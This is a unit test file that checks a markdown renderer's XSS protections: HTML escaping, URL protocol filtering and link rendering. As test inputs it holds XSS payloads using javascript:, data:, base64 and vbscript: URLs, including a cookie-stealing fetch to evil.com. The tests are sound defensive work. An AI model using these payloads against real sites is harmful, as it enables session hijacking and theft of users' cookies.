/**
 * BaseRenderer Unit Tests - XSS Prevention
 *
 * SECURITY: Tests for CRIT-1 XSS via Markdown Link Injection
 * @see grimoires/loa/a2a/audits/2026-01-21/SECURITY-AUDIT-REPORT.md
 */

import { describe, it, expect } from 'vitest';
import {
  markdownToHtml,
  isSafeUrl,
  escapeHtml,
} from '../../../../../src/services/theme/renderers/BaseRenderer.js';

describe('escapeHtml', () => {
  it('should escape HTML special characters', () => {
    expect(escapeHtml('<script>')).toBe('&lt;script&gt;');
    expect(escapeHtml('"test"')).toBe('&quot;test&quot;');
    expect(escapeHtml("'test'")).toBe('&#039;test&#039;');
    expect(escapeHtml('a & b')).toBe('a &amp; b');
  });

  it('should handle empty string', () => {
    expect(escapeHtml('')).toBe('');
  });

  it('should handle safe text', () => {
    expect(escapeHtml('Hello World')).toBe('Hello World');
  });
});

describe('isSafeUrl', () => {
  describe('safe protocols', () => {
    it('should allow https URLs', () => {
      expect(isSafeUrl('https://example.com')).toBe(true);
      expect(isSafeUrl('https://example.com/path?query=1')).toBe(true);
    });

    it('should allow http URLs', () => {
      expect(isSafeUrl('http://example.com')).toBe(true);
    });

    it('should allow mailto URLs', () => {
      expect(isSafeUrl('mailto:test@example.com')).toBe(true);
      expect(isSafeUrl('mailto:test@example.com?subject=Hello')).toBe(true);
    });
  });

  describe('dangerous protocols - SECURITY', () => {
    it('should block javascript: protocol', () => {
      expect(isSafeUrl('javascript:alert(1)')).toBe(false);
      expect(isSafeUrl('javascript:alert(document.cookie)')).toBe(false);
      expect(isSafeUrl('JAVASCRIPT:alert(1)')).toBe(false);
      expect(isSafeUrl('JavaScript:alert(1)')).toBe(false);
    });

    it('should block data: protocol', () => {
      expect(isSafeUrl('data:text/html,<script>alert(1)</script>')).toBe(false);
      expect(isSafeUrl('DATA:text/html,test')).toBe(false);
    });

    it('should block vbscript: protocol', () => {
      expect(isSafeUrl('vbscript:msgbox')).toBe(false);
      expect(isSafeUrl('VBSCRIPT:test')).toBe(false);
    });

    it('should block base64 encoded payloads', () => {
      expect(isSafeUrl('data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==')).toBe(false);
      expect(isSafeUrl('https://example.com/base64,test')).toBe(false);
    });

    it('should block URLs with embedded script tags', () => {
      expect(isSafeUrl('https://example.com?x=<script>alert(1)</script>')).toBe(false);
    });
  });

  describe('edge cases', () => {
    it('should handle relative URLs', () => {
      expect(isSafeUrl('/path/to/page')).toBe(true);
      expect(isSafeUrl('./relative')).toBe(true);
    });

    it('should handle invalid URLs', () => {
      expect(isSafeUrl('')).toBe(false);
      expect(isSafeUrl('not a url at all')).toBe(true); // Relative URL
    });

    it('should handle protocol-relative URLs', () => {
      // //example.com resolves to https://example.com with our base
      expect(isSafeUrl('//example.com')).toBe(true);
    });
  });
});

describe('markdownToHtml XSS prevention', () => {
  describe('safe links', () => {
    it('should render safe HTTPS links', () => {
      const result = markdownToHtml('[link](https://example.com)');
      expect(result).toContain('href="https://example.com"');
      expect(result).toContain('rel="noopener noreferrer"');
      expect(result).toContain('target="_blank"');
    });

    it('should render safe HTTP links', () => {
      const result = markdownToHtml('[link](http://example.com)');
      expect(result).toContain('href="http://example.com"');
    });

    it('should render mailto links', () => {
      const result = markdownToHtml('[email](mailto:test@example.com)');
      expect(result).toContain('href="mailto:test@example.com"');
    });

    it('should escape special characters in URLs', () => {
      const result = markdownToHtml('[link](https://example.com?a=1&b=2)');
      expect(result).toContain('href="https://example.com?a=1&amp;b=2"');
    });
  });

  describe('dangerous links - SECURITY', () => {
    it('should block javascript: protocol', () => {
      const result = markdownToHtml('[click](javascript:alert(1))');
      expect(result).not.toContain('javascript:');
      expect(result).not.toContain('<a href');
      expect(result).toContain('click'); // Text should remain
    });

    it('should block javascript: with complex payload', () => {
      const result = markdownToHtml(
        "[click](javascript:fetch('https://evil.com/steal?cookie='+document.cookie))"
      );
      expect(result).not.toContain('javascript:');
      expect(result).not.toContain('<a href');
    });

    it('should block data: protocol', () => {
      const result = markdownToHtml('[click](data:text/html,<script>alert(1)</script>)');
      expect(result).not.toContain('data:');
      expect(result).not.toContain('<a href');
    });

    it('should block data: with base64', () => {
      const result = markdownToHtml(
        '[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)'
      );
      expect(result).not.toContain('base64');
      expect(result).not.toContain('<a href');
    });

    it('should block vbscript: protocol', () => {
      const result = markdownToHtml('[click](vbscript:msgbox)');
      expect(result).not.toContain('vbscript:');
      expect(result).not.toContain('<a href');
    });

    it('should block mixed case dangerous protocols', () => {
      expect(markdownToHtml('[x](JAVASCRIPT:alert(1))')).not.toContain('<a href');
      expect(markdownToHtml('[x](JaVaScRiPt:alert(1))')).not.toContain('<a href');
      expect(markdownToHtml('[x](DATA:text/html,test)')).not.toContain('<a href');
    });
  });

  describe('other markdown features', () => {
    it('should render bold text', () => {
      expect(markdownToHtml('**bold**')).toContain('<strong>bold</strong>');
      expect(markdownToHtml('__bold__')).toContain('<strong>bold</strong>');
    });

    it('should render italic text', () => {
      expect(markdownToHtml('*italic*')).toContain('<em>italic</em>');
      expect(markdownToHtml('_italic_')).toContain('<em>italic</em>');
    });

    it('should render code', () => {
      expect(markdownToHtml('`code`')).toContain('<code>code</code>');
    });

    it('should render line breaks', () => {
      expect(markdownToHtml('line1\nline2')).toContain('<br>');
      expect(markdownToHtml('para1\n\npara2')).toContain('</p><p>');
    });

    it('should escape HTML in regular text', () => {
      const result = markdownToHtml('<script>alert(1)</script>');
      expect(result).not.toContain('<script>');
      expect(result).toContain('&lt;script&gt;');
    });
  });
});
